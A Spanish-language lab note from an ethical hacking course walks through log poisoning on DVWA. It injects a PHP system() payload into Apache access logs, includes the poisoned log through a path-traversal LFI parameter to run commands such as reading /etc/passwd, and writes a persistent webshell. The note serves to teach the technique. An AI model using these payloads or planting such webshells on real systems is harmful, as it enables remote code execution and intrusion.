@@ -1,0 +1,183 @@
+=====================================================
+  LOG POISONING (LFI + RCE via Apache logs)
+  D1n0 | Ethical Hacking Lab | U-TAD 2025-2026
+=====================================================
+
+----------------------------------------------------------------
+QUE ES
+----------------------------------------------------------------
+
+Log Poisoning combina dos vulnerabilidades:
+  1. LFI (Local File Inclusion): la app incluye ficheros locales
+     usando un parametro controlable por el usuario.
+  2. Escritura en logs: Apache registra TODAS las peticiones
+     en access_log, incluyendo la URL tal cual (sin sanitizar).
+
+La idea: inyectar codigo PHP en el log via la URL, y luego
+incluir ese log via LFI para que PHP lo interprete y ejecute.
+
+Requisitos:
+  - Parametro vulnerable a LFI (ej: ?page=)
+  - Apache escribiendo logs (access_log o access.log)
+  - Ruta del log accesible via LFI (o conocida)
+  - Peticion NO URL-encodeada (importante, ver abajo)
+
+----------------------------------------------------------------
+RUTAS DE LOGS DE APACHE
+----------------------------------------------------------------
+
+DVWA / LAMPP:
+  /opt/lampp/logs/access_log
+  /opt/lampp/logs/error_log
+
+Linux estandar:
+  /var/log/apache2/access.log
+  /var/log/apache2/error.log
+  /var/log/httpd/access_log
+
+Buscar si no la sabes:
+  ?page=../../../../etc/httpd/conf/httpd.conf   (ver ruta en config)
+  ?page=../../../../proc/self/environ            (alternativa)
+
+----------------------------------------------------------------
+VARIANTE DEL PROFE (misma tecnica, distinta forma)
+----------------------------------------------------------------
+
+El profe lo hace todo en una URL:
+  [ip]/vulnerabilities/fi/?CMDShell<?php system($_GET['cmd']);?>
+
+Esto NO ejecuta nada todavia. Son dos fases:
+
+FASE 1 - Envenenar el log (esta URL):
+  GET /vulnerabilities/fi/?CMDShell<?php system($_GET['cmd']);?>
+  --> Da 404 o error, no importa
+  --> Apache escribe esa linea en access_log con el payload dentro
+  --> "CMDShell" es solo una etiqueta identificativa, sin valor tecnico
+
+FASE 2 - Ejecutar via LFI (segunda URL):
+  ?page=../../../../opt/lampp/logs/access_log&cmd=id
+  --> page= carga el log via LFI
+  --> PHP encuentra el <?php...?> que inyectaste antes y lo ejecuta
+  --> cmd=id se pasa a $_GET['cmd'] del payload --> ejecuta id
+
+NOTA: el nombre del parametro (cmd, error, c...) da igual,
+lo que importa es que coincida entre el payload inyectado
+y el parametro que mandas en la peticion de ejecucion.
+
+----------------------------------------------------------------
+PASO 1 - INYECTAR PAYLOAD EN EL LOG
+----------------------------------------------------------------
+
+Hacer una peticion a la URL con el payload PHP en la ruta.
+Apache la registrara en access_log tal cual.
+
+Payload basico:
+  GET /vulnerabilities/<?php system($_GET['error']) ?> HTTP/1.1
+
+IMPORTANTE: interceptar con BurpSuite y enviar SIN URL encode.
+Si el navegador encodea los caracteres (<, >, ?, etc.) el log
+guardara %3C%3F... en vez de <?php... y PHP no lo interpretara.
+
+En BurpSuite Repeater:
+  1. Intercepta cualquier peticion a DVWA
+  2. Modifica la linea GET manualmente:
+     GET /vulnerabilities/<?php system($_GET['error']) ?> HTTP/1.1
+  3. Asegurate de que los < > ? no estan encodeados
+  4. Send --> da 404 (esperado, la ruta no existe)
+
+El servidor devuelve 404 pero ya ha escrito la linea en el log:
+  192.168.0.1 - - [25/Jan/2021] "GET /vulnerabilities/<?php system($_GET['error']) ?> HTTP/1.1" 404
+
+----------------------------------------------------------------
+PASO 2 - INCLUIR EL LOG VIA LFI
+----------------------------------------------------------------
+
+Ahora usamos el parametro LFI para cargar el fichero de log.
+Al incluirlo, PHP interpreta el codigo inyectado y ejecuta
+el comando que pasemos por el parametro 'error'.
+
+URL de explotacion:
+  http://TARGET/vulnerabilities/fi/?page=../../../../opt/lampp/logs/access_log&error=id
+
+  page=   --> apunta al log (path traversal hasta llegar)
+  error=  --> el comando a ejecutar (parametro del payload)
+
+Resultado esperado en la respuesta: salida de id, ls, etc.
+mezclada con las lineas del log (normal, es el log entero).
+
+Comandos utiles:
+  &error=id
+  &error=whoami
+  &error=ls -la /var/www/html
+  &error=cat /etc/passwd
+  &error=uname -a
+
+----------------------------------------------------------------
+PASO 3 - ESCALAR A WEBSHELL PERSISTENTE
+----------------------------------------------------------------
+
+En vez de ejecutar comandos sueltos, escribir una webshell
+en disco para tener acceso mas comodo:
+
+  &error=echo '<?php system($_GET["cmd"]); ?>' > /opt/lampp/htdocs/hackable/uploads/shell.php
+
+Luego acceder directamente:
+  http://TARGET/dvwa/hackable/uploads/shell.php?cmd=id
+
+----------------------------------------------------------------
+FLUJO COMPLETO RESUMIDO
+----------------------------------------------------------------
+
+  1. Identificar parametro LFI:
+     ?page=../../../../etc/passwd  --> si funciona, hay LFI
+
+  2. Identificar ruta del log:
+     ?page=../../../../opt/lampp/logs/access_log
+
+  3. Inyectar payload via BurpSuite (SIN URL encode):
+     GET /vulnerabilities/<?php system($_GET['error']) ?> HTTP/1.1
+     --> 404 esperado, el log ya tiene el payload
+
+  4. Ejecutar comandos via LFI + log:
+     ?page=../../../../opt/lampp/logs/access_log&error=id
+
+  5. (Opcional) Escalar a webshell persistente:
+     &error=echo '<?php system($_GET["cmd"]); ?>' > /ruta/shell.php
+
+----------------------------------------------------------------
+DIFERENCIA CON WEBSHELL VIA SQLi
+----------------------------------------------------------------
+
+  SQLi INTO OUTFILE:
+    - Escribe el fichero directamente en disco via MySQL
+    - Requiere privilegio FILE en MySQL
+    - Mas limpio y controlado
+
+  Log Poisoning:
+    - Inyecta codigo en un fichero de log existente
+    - Solo requiere LFI + que los logs sean legibles
+    - El log se va llenando con cada peticion (ruidoso)
+    - Util cuando no tienes SQLi pero si LFI
+
+----------------------------------------------------------------
+NOTAS IMPORTANTES
+----------------------------------------------------------------
+
+[!] El log crece con cada peticion. Si el fichero es muy grande
+    el LFI puede tardar o timeout. Normal.
+
+[!] Las lineas de log anteriores (sin payload) tambien se muestran
+    en la respuesta. Busca la salida de tu comando entre el ruido.
+
+[!] Si el payload aparece como texto plano (no se ejecuta):
+    - PHP no esta procesando el fichero (ruta incorrecta)
+    - El payload llego URL-encodeado al log
+
+[!] Si la respuesta esta vacia o da error al cargar el log:
+    - La ruta con path traversal es incorrecta
+    - Probar con mas o menos ../
+
+[!] En DVWA el parametro LFI suele ser:
+    vulnerabilities/fi/?page=AQUI
+
+=====================================================
